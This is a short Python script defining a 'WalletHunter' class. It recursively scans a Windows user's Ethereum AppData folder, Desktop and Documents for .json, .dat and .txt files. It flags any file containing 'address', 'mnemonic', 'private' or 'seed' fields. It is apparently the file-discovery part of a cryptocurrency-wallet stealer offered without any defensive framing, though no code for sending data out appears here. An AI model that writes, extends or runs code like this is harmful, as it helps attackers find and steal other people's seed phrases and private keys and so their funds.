import os
from pathlib import Path
import json

class WalletHunter:
    def __init__(self, search_dirs=None):
        if search_dirs is None:
            self.search_dirs = [
                os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Ethereum'),
                os.path.join(os.environ['USERPROFILE'], 'Desktop'),
                os.path.join(os.environ['USERPROFILE'], 'Documents'),
            ]
        else:
            self.search_dirs = search_dirs

    def hunt(self):
        wallets_found = []
        for search_dir in self.search_dirs:
            for extension in ['.json', '.dat', '.txt']:
                for file in Path(search_dir).rglob(f'*{extension}'):
                    if self.is_crypto_wallet(file):
                        wallets_found.append(str(file))
        return wallets_found

    def is_crypto_wallet(self, file_path):
        try:
            with open(file_path, 'r') as file:
                data = json.load(file)
            return 'address' in data or 'mnemonic' in data or 'private' in data or 'seed' in data
        except (json.JSONDecodeError, FileNotFoundError):
            return False

hunter = WalletHunter()
